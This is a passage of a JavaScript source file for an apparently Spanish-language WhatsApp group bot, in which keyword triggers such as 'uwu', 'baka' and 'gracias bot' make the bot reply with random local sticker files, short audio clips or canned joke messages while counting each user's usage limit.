					result7 = fs.readFileSync(`./multimedia/misstks/sticker/rpt8.webp`),
					result8 = fs.readFileSync(`./multimedia/misstks/sticker/rpt9.webp`),
					result9 = fs.readFileSync(`./multimedia/misstks/sticker/rpt10.webp`),
					result10 = fs.readFileSync(`./multimedia/misstks/sticker/rpt11.webp`),
					result11 = fs.readFileSync(`./multimedia/misstks/sticker/rpt12.webp`),
					result12 = fs.readFileSync(`./multimedia/misstks/sticker/rpt13.webp`),
					result13 = fs.readFileSync(`./multimedia/misstks/sticker/rpt14.webp`),
					result14 = fs.readFileSync(`./multimedia/misstks/sticker/rpt15.webp`),
					result15 = fs.readFileSync(`./multimedia/misstks/sticker/rpt16.webp`),
					result16 = fs.readFileSync(`./multimedia/misstks/sticker/rpt17.webp`),
					result17 = fs.readFileSync(`./multimedia/misstks/sticker/rpt18.webp`),
					result18 = fs.readFileSync(`./multimedia/misstks/sticker/rpt19.webp`),
					result19 = fs.readFileSync(`./multimedia/misstks/sticker/rpt20.webp`),
					result20 = fs.readFileSync(`./multimedia/misstks/sticker/rpt21.webp`),
					result21 = fs.readFileSync(`./multimedia/misstks/sticker/rpt22.webp`),
					result22 = fs.readFileSync(`./multimedia/misstks/sticker/rpt23.webp`),
					result23 = fs.readFileSync(`./multimedia/misstks/sticker/rpt24.webp`),
					result24 = fs.readFileSync(`./multimedia/misstks/sticker/rpt25.webp`),
					result25 = fs.readFileSync(`./multimedia/misstks/sticker/rpt26.webp`),
					result26 = fs.readFileSync(`./multimedia/misstks/sticker/rpt27.webp`),
					result27 = fs.readFileSync(`./multimedia/misstks/sticker/rpt28.webp`),
					result28 = fs.readFileSync(`./multimedia/misstks/sticker/rpt29.webp`),
					result29 = fs.readFileSync(`./multimedia/misstks/sticker/rpt30.webp`),
					result30 = fs.readFileSync(`./multimedia/misstks/sticker/rpt31.webp`),
					result31 = fs.readFileSync(`./multimedia/misstks/sticker/rpt32.webp`),
					result32 = fs.readFileSync(`./multimedia/misstks/sticker/rpt33.webp`),
					result33 = fs.readFileSync(`./multimedia/misstks/sticker/rpt34.webp`),
					result34 = fs.readFileSync(`./multimedia/misstks/sticker/rpt35.webp`),
					result35 = fs.readFileSync(`./multimedia/misstks/sticker/rpt36.webp`),
					result36 = fs.readFileSync(`./multimedia/misstks/sticker/rpt37.webp`),
					result37 = fs.readFileSync(`./multimedia/misstks/sticker/rpt38.webp`),
					result38 = fs.readFileSync(`./multimedia/misstks/sticker/rpt39.webp`),
					result39 = fs.readFileSync(`./multimedia/misstks/sticker/rpt40.webp`),
					result40 = fs.readFileSync(`./multimedia/misstks/sticker/rpt41.webp`),
					result41 = fs.readFileSync(`./multimedia/misstks/sticker/rpt42.webp`),
					result42 = fs.readFileSync(`./multimedia/misstks/sticker/rpt43.webp`),
					result43 = fs.readFileSync(`./multimedia/misstks/sticker/rpt44.webp`),
					result44 = fs.readFileSync(`./multimedia/misstks/sticker/rpt45.webp`),
					result45 = fs.readFileSync(`./multimedia/misstks/sticker/rpt46.webp`),
					result46 = fs.readFileSync(`./multimedia/misstks/sticker/rpt47.webp`),
					result47 = fs.readFileSync(`./multimedia/misstks/sticker/rpt48.webp`),
					result48 = fs.readFileSync(`./multimedia/misstks/sticker/rpt49.webp`),
					result49 = fs.readFileSync(`./multimedia/misstks/sticker/rpt50.webp`),
					result50 = fs.readFileSync(`./multimedia/misstks/sticker/rpt51.webp`),
					result51 = fs.readFileSync(`./multimedia/misstks/sticker/rpt52.webp`),
					result52 = fs.readFileSync(`./multimedia/misstks/sticker/rpt53.webp`),
					result53 = fs.readFileSync(`./multimedia/misstks/sticker/rpt54.webp`),
					result54 = fs.readFileSync(`./multimedia/misstks/sticker/rpt55.webp`),
					result55 = fs.readFileSync(`./multimedia/misstks/sticker/rpt56.webp`),
					result56 = fs.readFileSync(`./multimedia/misstks/sticker/rpt57.webp`),
					result57 = fs.readFileSync(`./multimedia/misstks/sticker/rpt58.webp`),
					result58 = fs.readFileSync(`./multimedia/misstks/sticker/rpt59.webp`),
					result59 = fs.readFileSync(`./multimedia/misstks/sticker/rpt60.webp`),
					result60 = fs.readFileSync(`./multimedia/misstks/sticker/rpt61.webp`),
					result61 = fs.readFileSync(`./multimedia/misstks/sticker/rpt62.webp`),
					result62 = fs.readFileSync(`./multimedia/misstks/sticker/rpt63.webp`),
					result63 = fs.readFileSync(`./multimedia/misstks/sticker/rpt64.webp`),
					result64 = fs.readFileSync(`./multimedia/misstks/sticker/rpt65.webp`),
					result65 = fs.readFileSync(`./multimedia/misstks/sticker/rpt66.webp`),
					result66 = fs.readFileSync(`./multimedia/misstks/sticker/rpt67.webp`),
					result67 = fs.readFileSync(`./multimedia/misstks/sticker/rpt68.webp`),
					result68 = fs.readFileSync(`./multimedia/misstks/sticker/rpt69.webp`),
					result69 = fs.readFileSync(`./multimedia/misstks/sticker/rpt70.webp`),
					result70 = fs.readFileSync(`./multimedia/misstks/sticker/rpt71.webp`),
					result71 = fs.readFileSync(`./multimedia/misstks/sticker/rpt72.webp`),
					result72 = fs.readFileSync(`./multimedia/misstks/sticker/rpt73.webp`),
					result73 = fs.readFileSync(`./multimedia/misstks/sticker/rpt74.webp`),
					result74 = fs.readFileSync(`./multimedia/misstks/sticker/rpt75.webp`),
					result75 = fs.readFileSync(`./multimedia/misstks/sticker/rpt76.webp`),
					result76 = fs.readFileSync(`./multimedia/misstks/sticker/rpt77.webp`)
				]
				var nikk = raewm[Math.floor(Math.random() * raewm.length)]
				teslagod.sendMessage(from, nikk, sticker, {
					quoted: rptardidos,
					contextInfo: {
						mentionedJid: [sender]
					},
					"forwardingScore": 9999,
					"isForwarded": true
				})
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
			}
			////Simp bot////
			if (budy.includes("bot gracias") || (budy.includes("Bot gracias") || (budy.includes("gracias bot") || (budy.includes("Gracias bot"))))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				teslagod.sendMessage(from, `${pushname} pa servirle mi king nwn`, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							fromMe: false,
							participant: `0@s.whatsapp.net`,
							...(from ? {
								remoteJid: "16505434800@s.whatsapp.net"
							} : {})
						},
						message: {
							"productMessage": {
								"product": {
									"productImage": {
										"mimetype": "image/jpeg",
										"jpegThumbnail": userthumb
									},
									"title": `${NameBot} 🔥`,
									"description": "@NeKosmic",
									"currencyCode": "USD",
									"priceAmount1000": "5000000",
									"salePriceAmount1000": "500",
									"url": "https://github.com/NeKosmic",
									"retailerId": `000000`,
									"productImageCount": 5
								},
								"businessOwnerJid": `0@s.whatsapp.net`
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				})
				await limitAdd(sender)
			}

			if (budy.includes("te amo bot") || (budy.includes("Te amo bot") || (budy.includes("bot te amo") || (budy.includes("Bot te amo"))))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				rm = [
					result = fs.readFileSync(`./multimedia/misstks/sticker/love1.webp`),
					result1 = fs.readFileSync(`./multimedia/misstks/sticker/love6.webp`),
					result2 = fs.readFileSync(`./multimedia/misstks/sticker/love2.webp`),
					result3 = fs.readFileSync(`./multimedia/misstks/sticker/love3.webp`),
					result4 = fs.readFileSync(`./multimedia/misstks/sticker/love4.webp`),
					result5 = fs.readFileSync(`./multimedia/misstks/sticker/love5.webp`)
				]
				nk = rm[Math.floor(Math.random() * rm.length)]
				teslagod.sendMessage(from, nk, sticker, {
					quoted: {
						key: {
							participant: '0@s.whatsapp.net'
						},
						message: {
							locationMessage: {
								name: `${pushname} <3`,
								jpegThumbnail: fs.readFileSync('./multimedia/imagenes/logo.jpg')
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender],
						"forwardingScore": 999,
						"isForwarded": true
					}
				})
				await limitAdd(sender)
			}
			//
			if (automensajesxd.includes("uwu")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				rom = [
					result1 = fs.readFileSync(`./multimedia/misstks/sticker/cringe1.webp`),
					result2 = fs.readFileSync(`./multimedia/misstks/sticker/cringe2.webp`),
					result3 = fs.readFileSync(`./multimedia/misstks/sticker/cringe3.webp`),
					result4 = fs.readFileSync(`./multimedia/misstks/sticker/cringe4.webp`),
					result5 = fs.readFileSync(`./multimedia/misstks/sticker/cringe5.webp`)
				]
				var nkosmo = rom[Math.floor(Math.random() * rom.length)]
				teslagod.sendMessage(from, nkosmo, sticker, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} UwU`,
							body: '',
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					}
				})
				await limitAdd(sender)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("owo")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var result = fs.readFileSync(`./multimedia/misstks/sticker/owobot.webp`)
				teslagod.sendMessage(from, result, sticker, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} UwU`,
							body: '',
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					}
				})
				await limitAdd(sender)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("awa")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var result = fs.readFileSync(`./multimedia/misstks/sticker/awabot.webp`)
				teslagod.sendMessage(from, result, sticker, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} UwU`,
							body: '',
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					}
				})
				await limitAdd(sender)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("ewe")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var result = fs.readFileSync(`./multimedia/misstks/sticker/ewebot.webp`)
				teslagod.sendMessage(from, result, sticker, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} UwU`,
							body: '',
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					}
				})
				await limitAdd(sender)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("unu")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var result = fs.readFileSync(`./multimedia/misstks/sticker/unubot.webp`)
				teslagod.sendMessage(from, result, sticker, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} UwU`,
							body: '',
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					}
				})
				await limitAdd(sender)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("7v7")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var result = fs.readFileSync(`./multimedia/misstks/sticker/7v7bot.webp`)
				teslagod.sendMessage(from, result, sticker, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} UwU`,
							body: '',
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					}
				})
				await limitAdd(sender)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("7w7")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var result = fs.readFileSync(`./multimedia/misstks/sticker/7w7bot.webp`)
				teslagod.sendMessage(from, result, sticker, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} UwU`,
							body: '',
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					}
				})
				await limitAdd(sender)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("7u7")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var result = fs.readFileSync(`./multimedia/misstks/sticker/7u7bot.webp`)
				teslagod.sendMessage(from, result, sticker, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} UwU`,
							body: '',
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					}
				})
				await limitAdd(sender)
				await limitAdd(sender)
			}
			// ;_; //
			if (automensajesxd.includes("tonto")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᵀᵒⁿᵗᵒ*_`)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("bobo")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴮᵒᵇᵒ*_`)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("papanatas")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴾᵃᵖᵃⁿᵃᵗᵃˢ*_`)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("perseve")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴾᵉʳˢᵉᵛᵉ* _`)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("pelele")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴾᵉˡᵉˡᵉ*_`)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("pamplinas")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᴾᵃᵐᵖˡᶦⁿᵃˢ*_`)
				await limitAdd(sender)
			}
			if (automensajesxd.includes("chispas")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*ˢᵉ ᵈᵉᵗᵉᶜᵗᵒ ᵘⁿ ᶦⁿˢᵘˡᵗᵒ ᵐᵘʸ ᶠᵘᵉʳᵗᵉ*\n_*ᶜʰᶦˢᵖᵃˢ*_`)
				await limitAdd(sender)
			}
			// si //
			if (automensajesxd.includes("kawai")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var audioxdc = fs.readFileSync('./multimedia/sonidos/audiouwu/onichan.mp3');
				teslagod.sendMessage(from, audioxdc, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Kawaii >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("baka")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var audioxdc = fs.readFileSync('./multimedia/sonidos/audiouwu/baka.mp3');
				teslagod.sendMessage(from, audioxdc, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Baka >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("onich")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/onich.mp3');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Oni-Chan >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("kudasai")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/yamete.mp3');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Yamete kudasai! >//<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("yutki")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/yutki.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Yutki >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("yokese")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/yokese.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Yokese >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("yajaro")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/yajaro.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Yajaro! >o<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("woau")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/woau.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Kawaii >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("unga")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/unga.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Ungaaa >//<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("umai")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/umai.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Umai... >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("imaaa")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/uma.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Imaaa! >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("uchinchi")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/uchinchi.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Uchinchi >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("tuturu")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/tuturu.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Tuturu >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("talcho")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/talcho.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Talcho >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("ssss")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/sss.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Suprise!!! >w<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("ohayou") || (automensajesxd.includes("Ohayou") || (automensajesxd.includes("ohayo") || (automensajesxd.includes("Ohayo"))))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/ohayo.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Ohayo >//<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("sempai")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/sempai.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Sempai >//<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("pupu")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/pupu.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Pupu >.<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("pikachu")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/pikachu.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Pikachu ⚡`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("ooaa")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/ooaa.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Ooaa >-<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("omg")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/omg.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `OMG >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("omaiwa")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/omaiwa.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Omaiwa >o<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("omaiga")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/omaiga.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Omaiga >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("ñañañi")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/ñañañi.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Ñañañi >-<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("ñaña")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/ñaña.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Ñaña >.<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("nya")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/nya.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Nya ^-^`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("niconico")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/niconico.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Nico-nico >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("nani")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/nani.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Nani >_<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("motomoto")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/motomoto.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Motomoto >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("mma")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/mma.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Mma... >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("mitamita")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/mitamita.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Mita-mita >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
